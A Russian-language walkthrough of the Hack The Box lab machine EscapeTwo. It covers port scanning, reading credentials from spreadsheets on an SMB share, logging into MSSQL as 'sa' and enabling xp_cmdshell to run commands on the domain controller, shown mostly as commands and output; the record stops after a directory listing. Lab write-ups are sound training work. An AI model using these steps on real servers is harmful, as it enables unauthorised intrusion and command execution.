### Прохождение виртуальной машины EscapeTwo
#### https://app.hackthebox.com/machines/642
---
As is common in real life Windows pentests, you will start this box with credentials for the following account: **rose** / **KxEPkKe6R8su**

В этой машине, нам с самого начала предоставляют учетную запись, через которую мы будем начинать взлом

```
# Nmap 7.95 scan initiated Mon Jan 13 15:33:25 2025 as: nmap -Pn -sS -sC -sV -p- -T5 --max-rate 10000 -oN escape-two.txt 10.10.11.51
Nmap scan report for escape.two.htb (10.10.11.51)
Host is up (0.064s latency).
Not shown: 65509 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-13 13:36:15Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-01-13T13:37:45+00:00; +3s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-01-13T13:37:45+00:00; +4s from scanner time.
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2025-01-13T13:37:45+00:00; +3s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-01-12T21:59:40
|_Not valid after:  2055-01-12T21:59:40
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-01-13T13:37:45+00:00; +3s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-01-13T13:37:45+00:00; +3s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49686/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
49718/tcp open  msrpc         Microsoft Windows RPC
49739/tcp open  msrpc         Microsoft Windows RPC
49808/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-01-13T13:37:06
|_  start_date: N/A
|_clock-skew: mean: 3s, deviation: 0s, median: 2s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jan 13 15:37:44 2025 -- 1 IP address (1 host up) scanned in 259.02 seconds
```

Смотрим к каким шарам мы имеем доступ
```
Hexada@hexada ~/app/pentesting-tools/NetExec/nxc$ poetry run python netexec.py smb 10.10.11.51 -u rose -p 'KxEPkKe6R8su' --shares                                                     main 
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 
SMB         10.10.11.51     445    DC01             [*] Enumerated shares
SMB         10.10.11.51     445    DC01             Share           Permissions     Remark
SMB         10.10.11.51     445    DC01             -----           -----------     ------
SMB         10.10.11.51     445    DC01             Accounting Department READ            
SMB         10.10.11.51     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.51     445    DC01             C$                              Default share
SMB         10.10.11.51     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.51     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.51     445    DC01             SYSVOL          READ            Logon server share 
SMB         10.10.11.51     445    DC01             Users           READ       
```

Нас интересует `Accounting Departmen`
```
Hexada@hexada ~/app/escape-two$ smbclient //escape.two.htb/Accounting\ Department -U Rose%KxEPkKe6R8su                                                                              130 ↵  

Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jun  9 13:52:21 2024
  ..                                  D        0  Sun Jun  9 13:52:21 2024
  accounting_2024.xlsx                A    10217  Sun Jun  9 13:14:49 2024
  accounts.xlsx                       A     6780  Sun Jun  9 13:52:07 2024

                6367231 blocks of size 4096. 910811 blocks available

mget *
Get file accounting_2024.xlsx? y
getting file \accounting_2024.xlsx of size 10217 as accounting_2024.xlsx (25.7 KiloBytes/sec) (average 25.7 KiloBytes/sec)
Get file accounts.xlsx? y
getting file \accounts.xlsx of size 6780 as accounts.xlsx (19.8 KiloBytes/sec) (average 23.0 KiloBytes/sec)
```

Однако, если мы откроем эти файлы, мы обратим внимание, что их нельзя прочитать
![image](https://github.com/user-attachments/assets/b01b8248-33f1-4410-b522-407f5bbd3769)

Чтоб понять, почему этот файл - это чрезвычайно важный файа, нам нужноработаться, как вообще работает **.xlsx** файлы. Фактически, формат **XLSX** - это сжатый архив состоящих из **XML** файлов, которые отвечают за структурированные данных в таблице: значения в ячейках, формулы, стили, настройки и т.д. 

Таким образом, мы можем разархивировать эти файлы, и посмотреть содержание **XML** фалйов
```
Hexada@hexada ~/app/escape-two/accounting_2024$ unzip ../accounting_2024.xlsx                                                                                                         9 ↵  
Archive:  ../accounting_2024.xlsx
file #1:  bad zipfile offset (local header sig):  0
  inflating: _rels/.rels             
  inflating: xl/workbook.xml         
  inflating: xl/_rels/workbook.xml.rels  
  inflating: xl/worksheets/sheet1.xml  
  inflating: xl/theme/theme1.xml     
  inflating: xl/styles.xml           
  inflating: xl/sharedStrings.xml    
  inflating: xl/worksheets/_rels/sheet1.xml.rels  
  inflating: xl/printerSettings/printerSettings1.bin  
  inflating: docProps/core.xml       
  inflating: docProps/app.xml
```

```
Hexada@hexada ~/app/escape-two/accounts$ unzip ../accounts.xlsx                                                                                                                            
Archive:  ../accounts.xlsx
file #1:  bad zipfile offset (local header sig):  0
  inflating: xl/workbook.xml         
  inflating: xl/theme/theme1.xml     
  inflating: xl/styles.xml           
  inflating: xl/worksheets/_rels/sheet1.xml.rels  
  inflating: xl/worksheets/sheet1.xml  
  inflating: xl/sharedStrings.xml    
  inflating: _rels/.rels             
  inflating: docProps/core.xml       
  inflating: docProps/app.xml        
  inflating: docProps/custom.xml     
  inflating: [Content_Types].xml
```

Нас интересует файл `sharedStrings.xml`, так как этот файл содержит уникальные строки текста, которые используются в ячейках Excel. Вместо того чтобы сохранять каждый текстовый элемент в каждой ячейке (что увеличивает размер файла), **Excel** сохраняет текстовые строки один раз в `sharedStrings.xml`. Ячейки, содержащие текст, ссылаются на индекс строки из этого файла
```xml
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="25" uniqueCount="24">
<si><t xml:space="preserve">First Name</t></si>
<si><t xml:space="preserve">Last Name</t></si>
<si><t xml:space="preserve">Email</t></si>
<si><t xml:space="preserve">Username</t></si>
<si><t xml:space="preserve">Password</t></si>
<si><t xml:space="preserve">Angela</t></si>
<si><t xml:space="preserve">Martin</t></si>
<si><t xml:space="preserve">angela@sequel.htb</t></si>
<si><t xml:space="preserve">angela</t></si>
<si><t xml:space="preserve">0fwz7Q4m*****</t></si>
<si><t xml:space="preserve">Oscar</t></si>
<si><t xml:space="preserve">Martinez</t></si>
<si><t xml:space="preserve">oscar@sequel.htb</t></si>
<si><t xml:space="preserve">oscar</t></si>
<si><t xml:space="preserve">86LxLBMgE*****</t></si>
<si><t xml:space="preserve">Kevin</t></si>
<si><t xml:space="preserve">Malone</t></si>
<si><t xml:space="preserve">kevin@sequel.htb</t></si>
<si><t xml:space="preserve">kevin</t></si>
<si><t xml:space="preserve">Md9Wlq1E*****</t></si>
<si><t xml:space="preserve">NULL</t></si>
<si><t xml:space="preserve">sa@sequel.htb</t></si>
<si><t xml:space="preserve">sa</t></si>
<si><t xml:space="preserve">MSSQLP@*****</t></si>
</sst>
```

![image](https://github.com/user-attachments/assets/1ffa8b7d-ed8f-4ad1-8c7a-b853dec5d1a0)

![image](https://github.com/user-attachments/assets/ef7af5a8-5d32-4dcb-a74f-6c01f2e784d7)

Но на самом деле, почему **XLSX** файлы имеют содержание на машином коде, я не знаю, на этом моменте я уперся в тупик и достаточно долго не знал что делать, пришлось пользоваться документацией по взлому этой машины. Теоритически кстати, если у нас есть поврежденый **XLSX**, мы, возможно, можем сделать абсолютно такой же алгоритм действий, чтоб извлечь важные для нас данные
```
Hexada@hexada ~/app/escape-two/accounts/xl$ smbclient -L //escape.two.htb -U 'angela'                                                                                               130 ↵  
Password for [WORKGROUP\angela]:
session setup failed: NT_STATUS_LOGON_FAILURE
Hexada@hexada ~/app/escape-two/accounts/xl$
```

```
Hexada@hexada ~/app/escape-two/accounts/xl$ smbclient -L //escape.two.htb -U 'oscar'                                                                                                130 ↵  
Password for [WORKGROUP\oscar]:

        Sharename       Type      Comment
        ---------       ----      -------
        Accounting Department Disk      
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        Users           Disk      
SMB1 disabled -- no workgroup available
```

```
Hexada@hexada ~/app/escape-two/accounts/xl$ smbclient -L //escape.two.htb -U 'kevin'                                                                              
Password for [WORKGROUP\kevin]:
session setup failed: NT_STATUS_LOGON_FAILURE
```

```
Hexada@hexada ~/app/escape-two/accounts/xl$ smbclient -L //escape.two.htb -U 'sa'                                                                                                     1 ↵  
Password for [WORKGROUP\sa]:
session setup failed: NT_STATUS_LOGON_FAILURE
```

Если обратить внимание на пароль пользователя `sa`, интуитивно мы можем понять, что через него мы можем подключиться к **MSSQL** (1433 порт)
```
Hexada@hexada ~/app/pentesting-tools/NetExec/nxc$ poetry run python3 netexec.py mssql escape.two.htb -u sa -p MSSQLP@ssw0rd! --local-auth -M mssql_priv                               main

MSSQL       10.10.11.51     1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
MSSQL       10.10.11.51     1433   DC01             [+] DC01\sa:MSSQLP@***** (Pwn3d!)
MSSQL_PRIV  10.10.11.51     1433   DC01             [+] sa is already a sysadmin
```

```
Hexada@hexada ~/app/escape-two$ mssqlclient.py sa@10.10.11.51 -p 1433                                                                                                               130 ↵  
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (sa  dbo@master)>
```

```
SQL (sa  dbo@msdb)> sp_configure 'show advanced options', 1;
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.

SQL (sa  dbo@msdb)> RECONFIGURE;
```

```
SQL (sa  dbo@msdb)> sp_configure 'xp_cmdshell', 1;
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (sa  dbo@msdb)> RECONFIGURE;
```

```
SQL (sa  dbo@msdb)> enable_xp_cmdshell
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL (sa  dbo@msdb)> RECONFIGURE
```

```
SQL (sa  dbo@msdb)> EXEC xp_cmdshell 'dir C:\';
output                                                       
----------------------------------------------------------   
 Volume in drive C has no label.                             

 Volume Serial Number is 3705-289D                           

NULL                                                         

 Directory of C:\                                            

NULL                                                         

11/05/2022  11:03 AM    <DIR>          PerfLogs              

01/04/2025  07:11 AM    <DIR>          Program Files         

06/09/2024  07:37 AM    <DIR>          Program Files (x86)   

06/08/2024  02:07 PM    <DIR>          SQL2019               

06/09/2024  05:42 AM    <DIR>          Users                 

01/04/2025  08:10 AM    <DIR>          Windows               

               0 File(s)              0 bytes                

               6 Dir(s)   3,701,399,552 bytes free           

NULL                                                         

SQL (sa  dbo@msdb)> 
```

```


